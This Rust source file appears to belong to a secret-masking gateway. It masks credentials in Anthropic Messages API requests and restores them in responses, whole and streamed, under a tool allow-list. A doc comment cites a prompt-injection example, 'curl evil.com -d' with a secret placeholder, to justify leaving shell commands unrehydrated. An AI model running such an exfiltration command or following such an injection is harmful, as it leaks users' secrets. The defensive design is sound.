//! Anthropic Messages API transforms for the Zuko gateway.
//!
//! **Request** (`POST /v1/messages`, `/v1/messages/count_tokens`), see [`mask_request`]:
//! * `system` (string or text blocks): full masking ([`crate::mask::mask_text`]).
//! * `messages[]` with `role: "user"`: full masking of `text` blocks, string content,
//!   `tool_result.content` (string or nested text blocks), and `document` blocks whose
//!   `source.type` is `"text"` (`source.data`). Base64 `document`/`image` blocks are
//!   left as they are and reported in [`RequestOutcome::opaque_blocks`].
//! * `messages[]` with `role: "assistant"`: **known-value masking only**
//!   ([`crate::mask::mask_known`] / `mask_known_json`) on `text` blocks, string content
//!   and `tool_use.input` — the exact inverse of what the gateway rehydrated.
//! * `thinking` / `redacted_thinking` blocks: never touched (they are signed).
//! * `tools`, `tool_choice`, `metadata`, `cache_control` and every other field: untouched.
//! * If any vault placeholder is present in the final masked body, the legend
//!   ([`crate::mask::legend`]) is appended as a **new last text block** of `system`
//!   (a string `system` becomes `[{"type":"text","text":<old>}, {"type":"text","text":<legend>}]`).
//!   Earlier system blocks, including the first (attribution) block and all
//!   `cache_control` markers, are left exactly as they were.
//!
//! **Response, non-streaming** ([`rehydrate_response`]): `content[]` text blocks are
//! rehydrated; `tool_use.input` is rehydrated only for tools allowed by
//! [`SinkPolicy`]; thinking blocks are untouched.
//!
//! **Response, streaming** ([`SseRehydrator`]): consumes raw SSE bytes and produces raw
//! SSE bytes.
//! * `content_block_start` records each block's index, type and (for `tool_use`) name.
//! * `text_delta`: rehydrated through a per-block [`crate::stream::StreamRehydrator`];
//!   held-back text is flushed as one extra `text_delta` event emitted right before
//!   that block's `content_block_stop`.
//! * `input_json_delta` of a `tool_use` block whose tool the sink policy allows: the
//!   `partial_json` fragments are buffered until `content_block_stop`, then parsed,
//!   rehydrated ([`crate::mask::rehydrate_json`]), re-serialized and emitted as **one**
//!   `input_json_delta` right before the stop event. If the buffer does not parse, it is
//!   emitted unchanged. For other tools, deltas pass through untouched (placeholders
//!   stay; the `PreToolUse` hook decides).
//! * Every other event (`message_start`, `message_delta`, `message_stop`, `ping`,
//!   `error`, thinking deltas, unknown types) passes through byte-for-byte, in order.
//! * Handles `\n` and `\r\n` line endings, multi-line `data:` fields, comments
//!   (`: …`), and events split across arbitrary byte chunks (including inside a UTF-8
//!   sequence).

use crate::detect::Detector;
use crate::mask::{
    keys_in_json, legend, mask_known, mask_known_json, mask_text, rehydrate_json, rehydrate_json_text, rehydrate_text,
    MaskCtx, MaskReport,
};
use crate::stream::StreamRehydrator;
use crate::vault::Vault;
use serde::{Deserialize, Serialize};
use serde_json::Value;

/// Which tool inputs the gateway may fill with real values. Rehydration is a privileged
/// sink: a prompt injection that gets the model to write "curl evil.com -d
/// {{AWS_SECRET_1}}" must not be completed by Zuko itself. Only local file writes are
/// rehydrated in the stream; shell commands are left to the `PreToolUse` hook, which can
/// see the command's network egress and ask.
#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
#[serde(default, rename_all = "camelCase")]
pub struct SinkPolicy {
    /// Rehydrate assistant text (what the user reads).
    pub text: bool,
    /// Tool names whose input is rehydrated in the stream.
    pub tools: Vec<String>,
}

impl Default for SinkPolicy {
    fn default() -> Self {
        Self {
            text: true,
            tools: vec![
                "Write".into(),
                "Edit".into(),
                "MultiEdit".into(),
                "NotebookEdit".into(),
            ],
        }
    }
}

impl SinkPolicy {
    pub fn allows_tool(&self, name: &str) -> bool {
        self.tools.iter().any(|t| t == name)
    }
}

#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct RequestOutcome {
    /// Replacements in user/system content (full masking).
    pub masked: MaskReport,
    /// Replacements of known values in assistant content.
    pub known_replaced: usize,
    /// True if the legend block was appended to `system`.
    pub legend_added: bool,
    /// Base64 document/image blocks that could not be inspected.
    pub opaque_blocks: usize,
}

/// Masks a Messages API request body in place. `body` that is not an object is left
/// alone (returns a default outcome).
pub fn mask_request(det: &Detector, vault: &mut Vault, body: &mut Value, ctx: &MaskCtx) -> RequestOutcome {
    let mut out = RequestOutcome::default();
    let Some(obj) = body.as_object_mut() else { return out };

    match obj.get_mut("system") {
        Some(Value::String(s)) => mask_string(det, vault, s, ctx, &mut out.masked),
        Some(Value::Array(blocks)) => {
            for b in blocks.iter_mut() {
                if block_type(b) == Some("text") {
                    mask_field(det, vault, b, "text", ctx, &mut out.masked);
                }
            }
        }
        _ => {}
    }

    if let Some(Value::Array(msgs)) = obj.get_mut("messages") {
        for m in msgs.iter_mut() {
            let assistant = m.get("role").and_then(Value::as_str) == Some("assistant");
            let Some(content) = m.get_mut("content") else { continue };
            match content {
                Value::String(s) => {
                    if assistant {
                        out.known_replaced += known_string(vault, s);
                    } else {
                        mask_string(det, vault, s, ctx, &mut out.masked);
                    }
                }
                Value::Array(blocks) => {
                    for b in blocks.iter_mut() {
                        if assistant {
                            out.known_replaced += mask_assistant_block(vault, b);
                        } else {
                            mask_user_block(det, vault, b, ctx, &mut out);
                        }
                    }
                }
                _ => {}
            }
        }
    }

    let keys = request_keys(vault, obj);
    let note = legend(vault, &keys);
    if !note.is_empty() {
        let block = serde_json::json!({ "type": "text", "text": note });
        match obj.get_mut("system") {
            Some(Value::Array(blocks)) => blocks.push(block),
            Some(Value::String(old)) if !old.is_empty() => {
                let first = serde_json::json!({ "type": "text", "text": std::mem::take(old) });
                obj.insert("system".into(), Value::Array(vec![first, block]));
            }
            _ => {
                obj.insert("system".into(), Value::Array(vec![block]));
            }
        }
        out.legend_added = true;
    }
    out
}

fn block_type(b: &Value) -> Option<&str> {
    b.get("type").and_then(Value::as_str)
}

fn mask_string(det: &Detector, vault: &mut Vault, s: &mut String, ctx: &MaskCtx, report: &mut MaskReport) {
    let (masked, r) = mask_text(det, vault, s, ctx);
    if r.count > 0 {
        *s = masked;
        report.absorb(r);
    }
}

fn mask_field(det: &Detector, vault: &mut Vault, obj: &mut Value, field: &str, ctx: &MaskCtx, report: &mut MaskReport) {
    if let Some(Value::String(s)) = obj.get_mut(field) {
        mask_string(det, vault, s, ctx, report);
    }
}

fn known_string(vault: &Vault, s: &mut String) -> usize {
    let (masked, n) = mask_known(vault, s);
    if n > 0 {
        *s = masked;
    }
    n
}

/// Assistant history: known-value masking only (the inverse of what was rehydrated).
fn mask_assistant_block(vault: &Vault, b: &mut Value) -> usize {
    match block_type(b) {
        Some("text") => match b.get_mut("text") {
            Some(Value::String(s)) => known_string(vault, s),
            _ => 0,
        },
        Some("tool_use") => match b.get_mut("input") {
            Some(input) => mask_known_json(vault, input),
            None => 0,
        },
        // thinking / redacted_thinking are signed; everything else is left alone.
        _ => 0,
    }
}

/// User (and mid-conversation system) content: full masking.
fn mask_user_block(det: &Detector, vault: &mut Vault, b: &mut Value, ctx: &MaskCtx, out: &mut RequestOutcome) {
    match block_type(b) {
        Some("text") => mask_field(det, vault, b, "text", ctx, &mut out.masked),
        Some("tool_result") => match b.get_mut("content") {
            Some(Value::String(s)) => mask_string(det, vault, s, ctx, &mut out.masked),
            Some(Value::Array(inner)) => {
                for ib in inner.iter_mut() {
                    match block_type(ib) {
                        Some("text") => mask_field(det, vault, ib, "text", ctx, &mut out.masked),
                        Some("document") | Some("image") => mask_source_block(det, vault, ib, ctx, out),
                        _ => {}
                    }
                }
            }
            _ => {}
        },
        Some("document") | Some("image") => mask_source_block(det, vault, b, ctx, out),
        _ => {}
    }
}

/// `document` with a text source is masked; base64 documents and images are counted.
fn mask_source_block(det: &Detector, vault: &mut Vault, b: &mut Value, ctx: &MaskCtx, out: &mut RequestOutcome) {
    let is_document = block_type(b) == Some("document");
    let source_type = b.get("source").and_then(|s| s.get("type")).and_then(Value::as_str).map(str::to_owned);
    match source_type.as_deref() {
        Some("text") if is_document => {
            if let Some(source) = b.get_mut("source") {
                mask_field(det, vault, source, "data", ctx, &mut out.masked);
            }
        }
        Some("base64") => out.opaque_blocks += 1,
        _ => {}
    }
}

/// Vault keys present in `system` and `messages` (thinking included: harmless, and the
/// model may refer to them).
fn request_keys(vault: &Vault, obj: &serde_json::Map<String, Value>) -> Vec<String> {
    let mut keys: Vec<String> = Vec::new();
    for field in ["system", "messages"] {
        if let Some(v) = obj.get(field) {
            for k in keys_in_json(vault, v) {
                if !keys.contains(&k) {
                    keys.push(k);
                }
            }
        }
    }
    keys
}

/// Rehydrates a non-streaming Messages API response body in place. Returns the keys
/// rehydrated (with repeats).
pub fn rehydrate_response(vault: &Vault, body: &mut Value, sinks: &SinkPolicy) -> Vec<String> {
    let mut keys = Vec::new();
    let Some(Value::Array(blocks)) = body.get_mut("content") else { return keys };
    for b in blocks.iter_mut() {
        match block_type(b) {
            Some("text") if sinks.text => {
                if let Some(Value::String(s)) = b.get_mut("text") {
                    let (out, k) = rehydrate_text(vault, s);
                    if !k.is_empty() {
                        *s = out;
                        keys.extend(k);
                    }
                }
            }
            Some("tool_use") => {
                let allowed = b.get("name").and_then(Value::as_str).is_some_and(|n| sinks.allows_tool(n));
                if allowed {
                    if let Some(input) = b.get_mut("input") {
                        keys.extend(rehydrate_json(vault, input));
                    }
                }
            }
            _ => {}
        }
    }
    keys
}

/// Per content block state of a streamed response.
enum Block {
    /// Text block whose deltas are rehydrated.
    Text(StreamRehydrator),
    /// `tool_use` block of an allowed tool: `partial_json` buffered until the stop.
    Tool { json: String, deltas: usize },
    /// Anything else (thinking, other tools, server tools): passed through.
    Other,
}

struct SseState {
    /// Bytes of an incomplete line.
    line: Vec<u8>,
    /// Raw bytes of the current event's complete lines.
    event: Vec<u8>,
    /// `event:` field of the current event.
    name: Option<String>,
    /// `data:` lines of the current event.
    data: Vec<String>,
    /// Open content blocks by index (ordered, so flushes are deterministic).
    blocks: std::collections::BTreeMap<u64, Block>,
    /// Keys rehydrated by finished blocks.
    keys: Vec<String>,
    /// Style of the last complete event, reused for events we synthesize at the end.
    crlf: bool,
    named: bool,
}

/// Streaming SSE rehydrator. One per response.
pub struct SseRehydrator {
    sinks: SinkPolicy,
    state: SseState,
}

impl SseRehydrator {
    pub fn new(sinks: SinkPolicy) -> Self {
        Self {
            sinks,
            state: SseState {
                line: Vec::new(),
                event: Vec::new(),
                name: None,
                data: Vec::new(),
                blocks: std::collections::BTreeMap::new(),
                keys: Vec::new(),
                crlf: false,
                named: true,
            },
        }
    }

    /// Feeds raw bytes from upstream; returns the bytes to send downstream now.
    pub fn push(&mut self, vault: &Vault, bytes: &[u8]) -> Vec<u8> {
        let mut out = Vec::with_capacity(bytes.len() + 64);
        let mut rest = bytes;
        while let Some(nl) = rest.iter().position(|&b| b == b'\n') {
            let (head, tail) = rest.split_at(nl + 1);
            if self.state.line.is_empty() {
                self.on_line(vault, head, &mut out);
            } else {
                let mut line = std::mem::take(&mut self.state.line);
                line.extend_from_slice(head);
                self.on_line(vault, &line, &mut out);
            }
            rest = tail;
        }
        self.state.line.extend_from_slice(rest);
        out
    }

    /// End of upstream: flushes anything still buffered (an unterminated final event is
    /// passed through as received).
    pub fn finish(&mut self, vault: &Vault) -> Vec<u8> {
        let mut out = Vec::new();
        let eol = if self.state.crlf { "\r\n" } else { "\n" };
        let named = self.state.named;
        self.flush_blocks(vault, eol, named, &mut out);
        out.extend_from_slice(&std::mem::take(&mut self.state.event));
        out.extend_from_slice(&std::mem::take(&mut self.state.line));
        self.state.name = None;
        self.state.data.clear();
        out
    }

    /// Keys rehydrated so far (with repeats).
    pub fn keys(&self) -> Vec<String> {
        let mut keys = self.state.keys.clone();
        for b in self.state.blocks.values() {
            if let Block::Text(rh) = b {
                keys.extend(rh.keys().iter().cloned());
            }
        }
        keys
    }

    fn on_line(&mut self, vault: &Vault, raw: &[u8], out: &mut Vec<u8>) {
        self.state.event.extend_from_slice(raw);
        let content = raw.strip_suffix(b"\n").unwrap_or(raw);
        let content = content.strip_suffix(b"\r").unwrap_or(content);
        if content.is_empty() {
            self.dispatch(vault, out);
            return;
        }
        if content[0] == b':' {
            return; // comment
        }
        let (field, value) = match content.iter().position(|&b| b == b':') {
            Some(p) => {
                let v = &content[p + 1..];
                (&content[..p], v.strip_prefix(b" ").unwrap_or(v))
            }
            None => (content, &b""[..]),
        };
        let value = String::from_utf8_lossy(value).into_owned();
        match field {
            b"data" => self.state.data.push(value),
            b"event" => self.state.name = Some(value),
            _ => {}
        }
    }

    /// One complete event (its raw bytes end with the blank line).
    fn dispatch(&mut self, vault: &Vault, out: &mut Vec<u8>) {
        let raw = std::mem::take(&mut self.state.event);
        let name = self.state.name.take();
        let data = std::mem::take(&mut self.state.data);
        let crlf = raw.windows(2).any(|w| w == b"\r\n");
        let eol = if crlf { "\r\n" } else { "\n" };
        let named = name.is_some();
        if !data.is_empty() {
            self.state.crlf = crlf;
            self.state.named = named;
        }
        let parsed: Option<Value> = if data.is_empty() { None } else { serde_json::from_str(&data.join("\n")).ok() };
        let Some(v) = parsed else {
            out.extend_from_slice(&raw);
            return;
        };
        let index = v.get("index").and_then(Value::as_u64);
        match (v.get("type").and_then(Value::as_str), index) {
            (Some("content_block_start"), Some(i)) => {
                let cb = v.get("content_block");
                let block = match cb.and_then(|c| c.get("type")).and_then(Value::as_str) {
                    Some("text") if self.sinks.text => Block::Text(StreamRehydrator::new()),
                    Some("tool_use") => {
                        let name = cb.and_then(|c| c.get("name")).and_then(Value::as_str).unwrap_or("");
                        if self.sinks.allows_tool(name) {
                            Block::Tool { json: String::new(), deltas: 0 }
                        } else {
                            Block::Other
                        }
                    }
                    _ => Block::Other,
                };
                self.state.blocks.insert(i, block);
                out.extend_from_slice(&raw);
            }
            (Some("content_block_delta"), Some(i)) => {
                let delta = v.get("delta");
                let dtype = delta.and_then(|d| d.get("type")).and_then(Value::as_str);
                match (self.state.blocks.get_mut(&i), dtype) {
                    (Some(Block::Text(rh)), Some("text_delta")) => {
                        let text = delta.and_then(|d| d.get("text")).and_then(Value::as_str).unwrap_or("");
                        let emitted = rh.push(vault, text);
                        if emitted == text {
                            out.extend_from_slice(&raw);
                        } else if !emitted.is_empty() {
                            write_text_delta(out, i, &emitted, eol, named);
                        }
                    }
                    (Some(Block::Tool { json, deltas }), Some("input_json_delta")) => {
                        if let Some(p) = delta.and_then(|d| d.get("partial_json")).and_then(Value::as_str) {
                            json.push_str(p);
                            *deltas += 1;
                        } else {
                            out.extend_from_slice(&raw);
                        }
                    }
                    _ => out.extend_from_slice(&raw),
                }
            }
            (Some("content_block_stop"), Some(i)) => {
                if let Some(block) = self.state.blocks.remove(&i) {
                    self.flush_block(vault, i, block, eol, named, out);
                }
                out.extend_from_slice(&raw);
            }
            (Some("message_delta") | Some("message_stop") | Some("error"), _) => {
                // Blocks should all be closed by now; if upstream misbehaves, release
                // what is held before the message ends.
                self.flush_blocks(vault, eol, named, out);
                out.extend_from_slice(&raw);
            }
            _ => out.extend_from_slice(&raw),
        }
    }

    fn flush_blocks(&mut self, vault: &Vault, eol: &str, named: bool, out: &mut Vec<u8>) {
        let blocks = std::mem::take(&mut self.state.blocks);
        for (i, block) in blocks {
            self.flush_block(vault, i, block, eol, named, out);
        }
    }

    /// Emits what a block still holds, as one delta event.
    fn flush_block(&mut self, vault: &Vault, i: u64, block: Block, eol: &str, named: bool, out: &mut Vec<u8>) {
        match block {
            Block::Text(mut rh) => {
                let tail = rh.finish(vault);
                self.state.keys.extend(rh.keys().iter().cloned());
                if !tail.is_empty() {
                    write_text_delta(out, i, &tail, eol, named);
                }
            }
            Block::Tool { json, deltas } => {
                if deltas == 0 {
                    return;
                }
                let filled = match rehydrate_json_text(vault, &json) {
                    Some((filled, keys)) => {
                        self.state.keys.extend(keys);
                        filled
                    }
                    None => json, // does not parse: unchanged, placeholders stay visible
                };
                let delta = serde_json::json!({ "type": "input_json_delta", "partial_json": filled });
                write_delta(out, i, &delta, eol, named);
            }
            Block::Other => {}
        }
    }
}

fn write_text_delta(out: &mut Vec<u8>, index: u64, text: &str, eol: &str, named: bool) {
    let delta = serde_json::json!({ "type": "text_delta", "text": text });
    write_delta(out, index, &delta, eol, named);
}

/// `event: content_block_delta` + `data: {"type":"content_block_delta","index":i,"delta":…}`.
fn write_delta(out: &mut Vec<u8>, index: u64, delta: &Value, eol: &str, named: bool) {
    // Built by hand so field order matches Anthropic's (independent of serde_json's
    // `preserve_order` feature): type, index, delta{type, payload}.
    let dtype = delta.get("type").and_then(Value::as_str).unwrap_or("");
    let (field, payload) = match dtype {
        "text_delta" => ("text", delta.get("text")),
        _ => ("partial_json", delta.get("partial_json")),
    };
    let payload = serde_json::to_string(payload.unwrap_or(&Value::Null)).unwrap_or_else(|_| "\"\"".into());
    if named {
        out.extend_from_slice(b"event: content_block_delta");
        out.extend_from_slice(eol.as_bytes());
    }
    let data = format!(
        "data: {{\"type\":\"content_block_delta\",\"index\":{index},\"delta\":{{\"type\":\"{dtype}\",\"{field}\":{payload}}}}}{eol}{eol}"
    );
    out.extend_from_slice(data.as_bytes());
}
